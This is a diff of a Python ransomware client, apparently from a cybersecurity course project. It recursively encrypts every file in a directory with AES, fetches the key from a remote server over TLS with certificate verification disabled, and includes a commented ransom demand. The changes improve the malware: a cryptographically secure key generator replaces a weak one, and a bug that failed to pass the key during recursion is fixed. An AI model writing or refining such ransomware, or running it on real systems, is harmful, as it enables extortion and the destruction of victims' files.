@@ -1,7 +1,7 @@
 import base64
+import secrets
 from Crypto.Cipher import AES
 from Crypto import Random
-import random
 import os
 from pathlib import Path
 import socket
@@ -14,17 +14,13 @@ unpad = lambda s : s[:-ord(s[len(s)-1:])]
 class AESCipher:
     def __init__(self, key=None):
         if key == None:
-            self.key = AESCipher.generate_key().encode("utf-8")
+            self.key = AESCipher.generate_key()
         else:
-            self.key = str(key).encode("utf-8")
+            self.key = key
 
     @staticmethod
     def generate_key():
-        chaset = "abcdefghijklmnopqrstuvwxyz123456789!@#$%^&*"
-        k = ""
-        for i in range(32):
-            k += random.choice(chaset)
-        return k
+        return secrets.token_bytes(32).hex()
 
     def encrypt( self, raw ):
         raw = pad(raw) # Padding raw text to fit AES block size, encoding it on the way
@@ -39,7 +35,6 @@ class AESCipher:
         iv = enc[:BS] # Reads random bytes from the encryption
         cipher = AES.new(self.key, AES.MODE_CBC, iv ) # Creates the key that was used to encrypt
         return unpad(cipher.decrypt( encrypted_text )) # Decrypts text and unpads it
-
 
 class Ransomware_Client:
     def __init__(self, key = None):
@@ -70,9 +65,9 @@ def encrypt_directory_content(dir_path, key = None):
     for item in dir_path.iterdir():
         if item.is_file():
             ransomware.encrypt_file(item)
+            print(f"Encrypted: {item}")
         else:
-            encrypt_directory_content(item)
-    print("Files encrypted! Pay 1000000$ to get them back")
+            encrypt_directory_content(item, key)
 
 def decrypt_directory_content(dir_path, key = None):
     ransomware = Ransomware_Client(key)
@@ -80,31 +75,32 @@ def decrypt_directory_content(dir_path, key = None):
     for item in dir_path.iterdir():
         if item.is_file():
             ransomware.decrypt_file(item)
+            print(f"Decrypted: {item}")
         else:
             decrypt_directory_content(item, ransomware.encryptor.key)
-    print("Files decrypted.")
 
 def get_key_from_serv(server_host, server_port):
     s = socket.socket()
-    ssl_sock = ssl.wrap_socket(s)
+
+    context = ssl.create_default_context()
+    context.check_hostname = False
+    context.verify_mode = ssl.CERT_NONE
+
+    ssl_sock = context.wrap_socket(s)
+
     ssl_sock.connect((server_host, server_port))
     print(f"Client has connected to {server_host}:{server_port}")
-    key = ssl_sock.recv(1024).decode()
+    raw_key = ssl_sock.recv(1024).decode()
+    key = bytes.fromhex(raw_key)
     print("Key received")
     ssl_sock.close()
     return key
-
-
-
-# Custom key encryption - you choose key:
-# ransomware = Ransomware_Client(key="Hellothisiskey12")
-
-# Random key encryption - random key generator:
-# ransomware = Ransomware_Client()
 
 # Encrypt Directory:
 if __name__ == "__main__":
     os.chdir(Path(__file__).resolve().parent) # Change directory to this script's directory
     dir_path = r"C:\Users\IDO123\Desktop\Projects\python\CyberCourse\Projects\TestDir"
     # encrypt_directory_content(dir_path, get_key_from_serv("127.0.0.1", 8080)) # Encrypt files
-    # decrypt_directory_content( dir_path, "ag1^gz3d#ajb!!ci5j6t92xt8jh$ucr*" ) # Decrypt files
+    # print("Files encrypted! Pay 1000000$ to get them back")
+    # decrypt_directory_content( dir_path, bytes.fromhex(r"'write key here'") ) # Decrypt files
+    # print("Files decrypted.")
